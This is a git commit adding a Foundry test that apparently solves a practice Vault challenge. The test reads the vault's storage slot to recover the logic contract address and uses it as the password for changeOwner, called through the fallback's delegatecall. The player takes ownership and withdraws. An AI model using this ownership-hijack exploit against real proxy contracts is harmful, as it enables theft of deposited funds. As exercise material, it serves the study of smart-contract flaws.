c351d10e52bb29e6adc58766a00664044ef1b9fd
zhao ding <dingzhao@dingzhaodeMacBook-Pro.local>
2024-11-09 11:07:26 +0800

    add Vault

---
+++ solidity-foundry/test/VaultLogic.t.sol
@@ -0,0 +1,61 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import {VaultLogic, Vault} from "../src/Vault.sol";
+
+contract VaultTest is Test {
+    Vault vault;
+    VaultLogic logic;
+    address private owner = address(0xDDDD);
+    address player = address(this);
+
+
+    function setUp() public {
+        vm.deal(owner, 1 ether);
+        vm.startPrank(owner);
+
+        bytes32 password = "123456";
+        logic = new VaultLogic(password);
+        vault = new Vault(address(logic));
+        vault.deposite{value: 1 ether}();
+
+        vm.stopPrank();
+    }
+
+    function testDepositAndWithdraw() public {
+        vm.deal(player, 1 ether);
+        vm.startPrank(player);
+
+        address logicAddress = address(
+            uint160(uint256(vm.load(address(vault), bytes32(uint256(1)))))
+        );
+        attack(bytes32(uint256(uint160(address(logicAddress)))), player);
+
+        assertEq(vault.owner(), player, "Owner was not changed correctly!");
+
+        vault.deposite{value: 1 ether}();
+        uint depositBalance = vault.deposites(player);
+        assertEq(depositBalance, 1 ether, "Deposit amount is incorrect");
+
+        vault.openWithdraw();
+
+        vault.withdraw();
+
+        depositBalance = vault.deposites(player);
+        assertEq(depositBalance, 0, "Withdraw failed");
+    }
+
+    function attack(bytes32 _password, address _newOwner) public {
+        bytes memory data = abi.encodeWithSignature(
+            "changeOwner(bytes32,address)",
+            _password,
+            _newOwner
+        );
+        // 触发 Vault 的 fallback 函数
+        (bool success, ) = address(vault).call(data);
+        require(success, "Attack failed");
+    }
+
+    receive() external payable {}
+}
